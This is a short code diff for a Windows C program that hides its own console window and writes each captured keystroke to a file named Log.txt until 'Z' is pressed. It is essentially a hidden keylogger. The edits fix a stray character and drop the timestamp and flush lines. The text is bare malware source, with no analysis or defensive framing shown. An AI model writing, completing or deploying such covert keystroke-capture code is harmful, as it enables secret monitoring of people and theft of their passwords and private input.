@@ -25,17 +25,16 @@ TCHAR getch() {
   return c;
 }
  
-int main() {Z
+int main() {
     TCHAR k;
     HWND window;
     AllocConsole();
     window=FindWindowA("ConsoleWindowClass",NULL);
     ShowWindow(window,0);
     FILE* file = fopen("Log.txt", "a+");
-    fprintf(file,"\n\n%s  %s\n\n",__TIME__,__DATE__);
     while ((k = getch()) != 'Z') {
         fputc(k,file);
-        fflush(file);
+        
     }
     fclose(file);
     return 0;
